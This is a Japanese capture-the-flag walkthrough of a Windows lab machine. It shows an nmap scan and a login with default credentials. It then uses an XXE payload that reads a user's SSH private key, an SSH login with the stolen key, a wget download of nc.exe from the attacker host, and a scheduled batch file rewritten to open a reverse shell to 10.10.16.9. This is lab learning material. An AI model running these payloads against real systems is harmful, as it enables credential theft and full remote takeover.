# 1.Port Scan

対象マシンのポートをスキャン
ip=10.129.95.192

sudo nmap -sC -A -Pn $ip

![e5a422d9b260c485957c0647fd8b5de5.png](../_resources/e5a422d9b260c485957c0647fd8b5de5.png)

HPを発見

![f426e0dd7875143eb3ee95852f99b3fb.png](../_resources/f426e0dd7875143eb3ee95852f99b3fb.png)

USERNAME: admin
PASSWORD: password

![27ef1fa98ff96df77943d93402463f7b.png](../_resources/27ef1fa98ff96df77943d93402463f7b.png)

orderから送信

![c8e53ea4af526ea8f3b909de3efbf941.png](../_resources/c8e53ea4af526ea8f3b909de3efbf941.png)

XMLを使用してる事を確認。

![03ac6c8ea6f7fd14d6111c5c5edceb67.png](../_resources/03ac6c8ea6f7fd14d6111c5c5edceb67.png)

ページソースからDanielユーザの存在を確認。

![ecc3b9b7f18122e1d927e07169db8ff3.png](../_resources/ecc3b9b7f18122e1d927e07169db8ff3.png)

<!DOCTYPE root [<!ENTITY abc SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>

itemの項目を&test;に変更

認証キーを取得

![907508e275dea197c8e5e9a0cb5852bb.png](../_resources/907508e275dea197c8e5e9a0cb5852bb.png)

取得した認証キーをファイルにコピー

`cat id_rsa`

![aa21a64c23b41309a3b8e17ecbebcb1b.png](../_resources/aa21a64c23b41309a3b8e17ecbebcb1b.png)

rsaファイルの権限を変更

![53b2688b00b22655876ecd58fcd45197.png](../_resources/53b2688b00b22655876ecd58fcd45197.png)

# 2.SSH Connect

取得した認証キーを使いsshで接続

`ssh -i id_rsa daniel@$ip`

![2c0c59b5b6f9eeae3534554f96cd714c.png](../_resources/2c0c59b5b6f9eeae3534554f96cd714c.png)

user.txtを取得

`whoami`

`cd Desktop`

`dir`

`type user.txt`

![1135c618f09eecc922acfad0c45188d5.png](../_resources/1135c618f09eecc922acfad0c45188d5.png)


C直下に移動して手掛かりになるファイルを調査。
Log-Managementフォルダにjob.batを発見。

`cd ../`

`cd ../../`

`dir`

`C:/Log-Managment`

![e9dc8956ef1fa64e8e7b75d24ab9f35d.png](../_resources/e9dc8956ef1fa64e8e7b75d24ab9f35d.png)

job.bat内を確認してwevtutilを実行して管理者権限があることを確認

`type job.bat`

![5489e2ebef046584f6cce9c5c307553a.png](../_resources/5489e2ebef046584f6cce9c5c307553a.png)

powershellを起動してschetasksを確認

job.batに関連したtaskは発見できなかった

![f8451be4c53451a7172aaaa6d5390955.png](../_resources/f8451be4c53451a7172aaaa6d5390955.png)

kadoussiteiru purosesu wo kakunin
稼働しているプロセスを確認
wevtutilが稼働しているのを確認

![749297751d47de83b5bda331e22ecd43.png](../_resources/749297751d47de83b5bda331e22ecd43.png)

![b7a94ab139dcb9b427b8f91a9afded70.png](../_resources/b7a94ab139dcb9b427b8f91a9afded70.png)

# 3.reverse shell

job.batを書き換えてリバースシェルを実行する

ローカルでサーバを立ち上げる

![bf56da2abee1aaec33170e947f39daee.png](../_resources/bf56da2abee1aaec33170e947f39daee.png)

ローカルサーバからnc.exeをアップロードする

`wget http://10.10.16.9/nc.exe -outfile nc.exe`

![a847a5677863854f6fc8bea3de72865a.png](../_resources/a847a5677863854f6fc8bea3de72865a.png)


echoコマンドを使いjob.batの内容をローカルマシンの指定したポートに接続するように
書き換える。

`echo C:\Log-Management\nc.exe -e cmd.exe 10.10.16.9 1234 > C:\Log-Management\job.bat`  
`type job.bat`

![1fde06f59216c541a4455a4e614c4a66.png](../_resources/1fde06f59216c541a4455a4e614c4a66.png)

# 4.Flag Get

接続を確認

![4fbbf0a061c80c1e6d20198a1ab7eb95.png](../_resources/4fbbf0a061c80c1e6d20198a1ab7eb95.png)

root.txtを取得

`cd C:\Users\Administrator\Desktop`

`dir`

`cd C:\Users\Administrator\Desktop`

![cc6718444b36158bbcb47f3925f73211.png](../_resources/cc6718444b36158bbcb47f3925f73211.png)